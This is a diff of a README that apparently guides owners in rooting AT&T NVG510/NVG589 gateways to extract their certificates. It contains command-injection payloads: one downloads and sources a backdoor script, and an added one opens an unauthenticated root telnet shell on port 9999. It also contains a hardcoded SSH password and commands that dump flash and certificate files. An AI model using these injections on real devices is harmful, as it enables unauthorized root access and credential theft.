@@ -23,39 +23,8 @@ Now, the home router connects optical network terminal(ONT) directly. You should
 [Back to menu](#menu)
 ## Extract Certificates
 The certificates extracted from both NVG510 and NVG589 work, however NVG510 costs less and is easier to root.
-- [NVG510](#nvg510)
-- [NVG589](#nvg589) (maybe NVG599)
-### NVG510
-#### Rooting
-Credit: [earlz](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui)
-- Downgrade firmware to [9.0.6h2d30](firmware/nvg510/nbxv9.0.6h2d30.bin) if necessary. Known vulnerable firmwares are:
-  - NVG510 9.0.6h2d30
-  - NVG510 9.0.6h2d21
-  - NVG510 9.0.6h048
-- Follow this guide [Rooting The NVG510 from the WebUI](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui).  
-If NVG510 has no connection to internet, you may want to setup a local http server for NVG510 to download the script
-  - Download [http://earlz.net/static/backdoor.nvg510.sh](http://earlz.net/static/backdoor.nvg510.sh) to your local machine
-  - Use Python to setup a simple http server. `python -m http.server` or `python -m SimpleHTTPServer` for Python2
-  - In the page source of the ATT firmware update page [http://192.168.1.254/cgi-bin/update.ha](http://192.168.1.254/cgi-bin/update.ha) look for the word `nonce` and copy the value shown in quotes. This value changes every time the page is loaded! Example: `815a0aaa0000176012db85d7d7cac9b31e749a44b6551d02`
-  - In the text box on the [earlz control2 page](http://earlz.net/static/control2.html), change the command to `errrr && wget http://YOUR_LOCAL_IP:8000/backdoor.nvg510.sh -O /tmp/backdoor.sh && source /tmp/backdoor.sh && errr`
-<!-- - If it is successful, you should see something like this: -->
-- Login `telnet 192.168.1.254 28`. The username is **admin** and the password is your modem's *access code* written on the label of the modem
-- Once connected, type `!` to switch to a root shell
+- [NVG589](#nvg589)
 
-#### Extract Certificates
-- Download [busybox-mips](https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mips) to your **local** device. 
-- Start Python http server. `python -m http.server` or `python -m SimpleHTTPServer` for Python2
-- In NVG510, `wget https://YOUR_LOCAL_IP:8000/busybox-mips -O /tmp/busybox`
-- `chmod +x /tmp/busybox`
-- `/tmp/busybox dd if=/dev/mtdblock4 of=/tmp/mfg.dat bs=1k`
-- `mkdir /tmp/images` 
-- `mount -o blind /tmp/images /www/att/images`
-- `cp /tmp/mfg.dat /www/att/images`
-- `cd /tmp`
-- `tar cf cert.tar /etc/rootcert/`
-- `cp cert.tar /www/att/images`
--  Download http://192.168.1.254/images/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device
-   
 ### NVG589 
 #### Rooting
 Credit: [nomotion](https://www.nomotion.net/blog/sharknatto/)
@@ -72,12 +41,9 @@ Credit: [nomotion](https://www.nomotion.net/blog/sharknatto/)
   - Now ssh should be enabled. **Please let me know if you find an easier and simpler method**.
 - In NVG589, run the following commands in order. (Credit: [samlii@dslreports](https://www.dslreports.com/forum/r32375916-))
   ```
-  ping -c 1 192.168.1.254;echo /bin/nsh >>/etc/shells
-  ping -c 1 192.168.1.254;echo /bin/sh >>/etc/shells
-  ping -c 1 192.168.1.254;sed -i 's/cshell/nsh/g' /etc/passwd
+  ping -c 1 192.168.1.254;/usr/sbin/telnetd -l /bin/sh -p 9999
   ```
-- Exit `exit` and shh back `ssh remotessh@192.168.1.254` (password:`5SaP9I26`)
-- Type `!`. It switches to root shell.
+- Telnet port 9999 to get the root shell
 
 #### Extract Certificates
 - In NVG589, run the following commands in order. Make sure you are in root shell.
